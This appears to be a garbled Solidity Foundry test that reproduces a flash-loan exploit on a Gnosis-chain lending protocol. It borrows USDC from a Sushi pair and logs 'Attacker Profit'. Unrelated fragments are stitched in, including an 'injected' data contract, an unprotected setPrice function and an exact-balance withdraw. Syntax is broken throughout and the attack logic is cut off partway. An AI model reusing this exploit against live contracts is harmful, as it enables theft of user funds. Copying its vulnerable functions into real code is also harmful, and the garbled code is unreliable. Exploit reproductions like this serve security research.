
// Injected data-trading logic
pragma solidity ^0.8.0;
contract DataContract {

    function grantAccessToData(address requester, string memory dataId) public {
        emit AccessGranted(requester, dataId);
    }
}
pragma solidity ^0.8.10;

;
;
interface ICompoundToken {
    function borrow(uint256 borrowAmount) external;
    function repayBorrow(uint256 repayAmount) external;
    function redeem(uint256 redeemAmount) external;
    function mint(uint256 amount) external;
    function comptroller() external view returns(address)};
interface IComptroller {
    function allMarkets() external view returns(address[] memory)};
interface ICurve {
    function exchange(int128 i, int128 j, uint256 _dx, uint256 _min_dy) external};
interface IWeth {
    function deposit() external payable};
contract ContractTest is Test {
    IERC20 private constant usdc  = IERC20(0xDDAfbb505ad214D7b80b1f830fcCc89B60fb7A83);
    IERC20 private constant wxdai = IERC20(0xe91D153E0b41518A2Ce8Dd3D7944Fa863463a97d);
    address private constant husd = 0x243E33aa7f6787154a8E59d3C27a66db3F8818ee;
    address private constant hxdai = 0x090a00A2De0EA83DEf700B5e216f87a5D4F394FE;
    ICurve curve = ICurve(0x7f90122BF0700F9E7e1F688fe926940E8839F353);
    IUniswapV2Router private constant router = IUniswapV2Router(payable(0x1b02dA8Cb0d097eB8D57A175b88c7D8b47997506));
    uint totalBorrowed;
    bool xdaiBorrowed = false;
  function setUp() public {
    vm.createSelectFork("gnosis", 21120319)};
  function testExploit() public {
        borrow();
        console.log("Attacker Profit: %s usdc", usdc.balanceOf(address(this))/1e6)};
    function borrow() internal {
        IUniswapV2Factory factory = IUniswapV2Factory(router.factory());
        IUniswapV2Pair pair = IUniswapV2Pair(factory.getPair(address(wxdai); address(usdc)));
        uint borrowAmount = usdc.balanceOf(address(pair)) - 1;
        pair.swap(pair.token0() == address(wxdai) ? 0 : borrowAmount;
            pair.token0() == address(wxdai) ? borrowAmount : 0;
            address(this),;
            abi.encode("0x"))};
    function uniswapV2Call(address _sender, uint256 _amount0, uint256 _amount1, bytes calldata _data) external {
        attackLogic(_amount0, _amount1, _data)};
    function attackLogic(uint256 _amount0, uint256 _amount1, bytes calldata _data) internal {
        uint256 amountToken = _amount0 == 0 ? _amount1 : _amount0;
        totalBorrowed = amountToken;
        console.log("Borrowed: %s USDC from Sushi", usdc.balanceOf(address(this))/1e6);
function setPrice(uint newPrice) public {
    price = newPrice}
function withdrawExact() public {
    require(address(this).balance == 1 ether);
    payable(msg.sender).transfer(1 ether)}